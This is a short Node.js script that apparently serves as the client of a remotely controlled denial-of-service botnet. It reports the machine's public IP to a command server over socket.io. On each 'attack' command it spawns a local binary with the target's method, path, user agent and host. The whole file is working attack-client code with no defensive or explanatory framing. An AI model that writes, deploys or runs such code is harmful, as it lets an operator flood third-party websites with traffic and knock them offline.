const { io } = require("socket.io-client");
const axios = require("axios");
const Url = require("url-parse");
const config = require("../config.json");
const { spawn } = require("child_process");

(async () => {
  const ipResponse = await axios.get("https://ifconfig.me/");
  const ip = ipResponse.data;

  const socket = io(config.address);
  socket.emit("join", {
    ip
  });

  socket.on("attack", (opts) => {
    const url = new Url(opts.url);
    const { method, user_agent } = opts;

    let args = [method, url.pathname, user_agent, url.hostname, url.hostname + ":443"];
    console.log(args);

    spawn("../tool/target/debug/tool", args);
  });

  // EXIT HANDLERS
  process.on("SIGINT", () => {
    socket.emit("close", {
      ip
    });

    process.exit();
  });
  process.on("exit", () => {
    socket.emit("close", {
      ip
    });

    process.exit();
  });
})();